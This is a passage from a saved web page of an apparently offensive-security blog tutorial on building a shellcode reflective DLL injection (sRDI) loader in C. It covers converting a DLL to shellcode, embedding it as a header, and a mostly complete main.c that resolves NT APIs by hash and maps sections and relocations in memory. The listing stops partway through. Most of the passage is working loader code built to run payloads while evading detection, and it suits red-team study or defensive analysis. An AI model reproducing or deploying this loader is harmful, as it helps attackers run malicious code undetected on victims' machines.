PoC.</p><!--kg-card-end: html--><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/hasherezade/pe_to_shellcode?ref=blog.malicious.group"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - hasherezade/pe_to_shellcode: Converts PE into a shellcode</div><div class="kg-bookmark-description">Converts PE into a shellcode. Contribute to hasherezade/pe_to_shellcode development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="./Writing your own RDI _sRDI loader using C and ASM_files/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">hasherezade</span></div></div><div class="kg-bookmark-thumbnail"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/pe_to_shellcode" alt=""></div></a></figure><!--kg-card-begin: html--><p>After turning your <code>dll_poc.dll</code> into shellcode <code>dll_poc.bin</code>, you can use the <code>xxd</code> tool to make the header file for you to use.</p><!--kg-card-end: html--><!--kg-card-begin: html--><pre>xxd -i dll_poc.bin &gt; dll.h</pre><!--kg-card-end: html--><!--kg-card-begin: html--><p>Then you simply add the <code>dll.h</code> header file to the <code>src/h/</code> folder with the others.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-19.png" class="kg-image" alt="" loading="lazy" width="2000" height="1670" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-19.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-19.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-19.png 1600w, https://blog.malicious.group/content/images/2023/04/image-19.png 2352w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>The header file only includes two variables, <code>dll_bin</code> and <code>dll_bin_len</code>, which store the dll bytes and its size respectively.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>With our new <code>dll.h</code> header file, we can go back to <code>start()</code> and change <i>Step 1</i> to use the shellcode instead of the on-disk DLL file.  Using the <code>dll.h</code> header file, our <i>Step 1</i> goes from 35 lines of code, to a couple as seen below.</p><!--kg-card-end: html--><p></p><h3 id="replace-step-1">Replace Step 1</h3><p>In this step, the binary representation of the DLL file is read from header stub...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/1fc85e5dc83e9d4cd96ed527d52280f6.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121815786" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-srdi_step_1-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="srdi_step_1.c">
        <tbody><tr>
          <td id="file-srdi_step_1-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-srdi_step_1-c-LC1" class="blob-code blob-code-inner js-file-line">NTSTATUS status;</td>
        </tr>
        <tr>
          <td id="file-srdi_step_1-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-srdi_step_1-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *dll_bytes = dll_bin;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/1fc85e5dc83e9d4cd96ed527d52280f6/raw/25df47b2ec1c056c2c1cef6df11714d6ed3d16a0/srdi_step_1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/1fc85e5dc83e9d4cd96ed527d52280f6#file-srdi_step_1-c">
          srdi_step_1.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>To avoid printing all the other steps since the code is almost identical, I am going to print the new <code>main.c</code> showing that we removed 33 lines of code from Step 1 when using sRDI over RDI injection. There are also minor changes, but they should be obvious when looking at the following code.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/6b8a3004ffd348630897211fc2d656e5.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121815925" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-srdi_main-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="srdi_main.c">
        <tbody><tr>
          <td id="file-srdi_main-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-srdi_main-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-srdi_main-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>peb.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-srdi_main-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>dll.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-srdi_main-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-srdi_main-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">mc</span>(<span class="pl-k">void</span>* dest, <span class="pl-k">const</span> <span class="pl-k">void</span>* src, <span class="pl-c1">size_t</span> n){</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-srdi_main-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span>* d = (<span class="pl-k">char</span>*)dest;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-srdi_main-c-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">const</span> <span class="pl-k">char</span>* s = (<span class="pl-k">const</span> <span class="pl-k">char</span>*)src;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-srdi_main-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (n--)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-srdi_main-c-LC9" class="blob-code blob-code-inner js-file-line">        *d++ = *s++;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-srdi_main-c-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> dest;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-srdi_main-c-LC11" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-srdi_main-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-srdi_main-c-LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">size_t</span> <span class="pl-en">sl</span>(<span class="pl-k">const</span> <span class="pl-k">char</span>* str) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-srdi_main-c-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> len = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-srdi_main-c-LC15" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (*str++)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-srdi_main-c-LC16" class="blob-code blob-code-inner js-file-line">        len++;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-srdi_main-c-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> len;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-srdi_main-c-LC18" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-srdi_main-c-LC19" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-srdi_main-c-LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">start</span>() {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-srdi_main-c-LC21" class="blob-code blob-code-inner js-file-line">  </td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-srdi_main-c-LC22" class="blob-code blob-code-inner js-file-line">    NTSTATUS status;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-srdi_main-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-srdi_main-c-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *dll_bytes = dll_bin;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-srdi_main-c-LC25" class="blob-code blob-code-inner js-file-line">    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-srdi_main-c-LC26" class="blob-code blob-code-inner js-file-line">    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_bytes + dos_header-&gt;<span class="pl-smi">e_lfanew</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-srdi_main-c-LC27" class="blob-code blob-code-inner js-file-line">    SIZE_T dll_image_size = nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">SizeOfImage</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-srdi_main-c-LC28" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-srdi_main-c-LC29" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *dll_base = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-srdi_main-c-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_ntdll = <span class="pl-c1">get_ntdll</span>();</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-srdi_main-c-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_allocate_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtAllocateVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-srdi_main-c-LC32" class="blob-code blob-code-inner js-file-line">    NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-srdi_main-c-LC33" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_allocate_virtual_memory</span>((HANDLE) -<span class="pl-c1">1</span>, &amp;dll_base, <span class="pl-c1">0</span>, &amp;dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-srdi_main-c-LC34" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-srdi_main-c-LC35" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> delta_image_base = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base - (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">ImageBase</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-srdi_main-c-LC36" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">mc</span>(dll_base, dll_bytes, nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">SizeOfHeaders</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-srdi_main-c-LC37" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-srdi_main-c-LC38" class="blob-code blob-code-inner js-file-line">    PIMAGE_SECTION_HEADER section = <span class="pl-c1">IMAGE_FIRST_SECTION</span>(nt_headers);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-srdi_main-c-LC39" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span>(<span class="pl-c1">size_t</span> i = <span class="pl-c1">0</span>; i &lt; nt_headers-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">NumberOfSections</span>; i++) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-srdi_main-c-LC40" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *section_destination = (LPVOID)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)section-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-srdi_main-c-LC41" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *section_bytes = (LPVOID)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_bytes + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)section-&gt;<span class="pl-smi">PointerToRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-srdi_main-c-LC42" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">mc</span>(section_destination, section_bytes, section-&gt;<span class="pl-smi">SizeOfRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-srdi_main-c-LC43" class="blob-code blob-code-inner js-file-line">        section++;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-srdi_main-c-LC44" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-srdi_main-c-LC45" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-srdi_main-c-LC46" class="blob-code blob-code-inner js-file-line">    IMAGE_DATA_DIRECTORY relocations = nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_BASERELOC];</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-srdi_main-c-LC47" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> relocation_table = relocations.<span class="pl-smi">VirtualAddress</span> + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-srdi_main-c-LC48" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> relocations_processed = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L49" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-srdi_main-c-LC49" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L50" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-srdi_main-c-LC50" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(relocations_processed &lt; relocations.<span class="pl-smi">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L51" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-srdi_main-c-LC51" class="blob-code blob-code-inner js-file-line">        PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L52" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-srdi_main-c-LC52" class="blob-code blob-code-inner js-file-line">        relocations_processed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L53" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-srdi_main-c-LC53" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> relocations_count = (relocation_block-&gt;<span class="pl-smi">BlockSize</span> - <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK)) / <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L54" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="file-srdi_main-c-LC54" class="blob-code blob-code-inner js-file-line">        PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L55" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="file-srdi_main-c-LC55" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L56" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="file-srdi_main-c-LC56" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">for</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> i = <span class="pl-c1">0</span>; i &lt; relocations_count; i++) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L57" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="file-srdi_main-c-LC57" class="blob-code blob-code-inner js-file-line">            relocations_processed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L58" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="file-srdi_main-c-LC58" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span>(relocation_entries[i].<span class="pl-smi">Type</span> == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L59" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="file-srdi_main-c-LC59" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">continue</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L60" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="file-srdi_main-c-LC60" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L61" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="file-srdi_main-c-LC61" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> relocation_rva = relocation_block-&gt;<span class="pl-smi">PageAddress</span> + relocation_entries[i].<span class="pl-smi">Offset</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L62" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="file-srdi_main-c-LC62" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> address_to_patch = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L63" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="file-srdi_main-c-LC63" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *p_nt_read_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtReadVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L64" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="file-srdi_main-c-LC64" class="blob-code blob-code-inner js-file-line">            NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L65" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="file-srdi_main-c-LC65" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_read_virtual_memory</span>(<span class="pl-c1">NtCurrentProcess</span>(), (<span class="pl-k">void</span> *)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + relocation_rva), &amp;address_to_patch, <span class="pl-k">sizeof</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>), <span class="pl-c1">NULL</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L66" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="file-srdi_main-c-LC66" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">return</span> -<span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L67" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="file-srdi_main-c-LC67" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L68" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="file-srdi_main-c-LC68" class="blob-code blob-code-inner js-file-line">            address_to_patch += delta_image_base;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L69" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="file-srdi_main-c-LC69" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">mc</span>((<span class="pl-k">void</span> *)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + relocation_rva), &amp;address_to_patch, <span class="pl-k">sizeof</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>));</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L70" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="file-srdi_main-c-LC70" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L71" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="file-srdi_main-c-LC71" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L72" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="file-srdi_main-c-LC72" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L73" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="file-srdi_main-c-LC73" class="blob-code blob-code-inner js-file-line">    PIMAGE_IMPORT_DESCRIPTOR import_descriptor;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L74" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="74"></td>
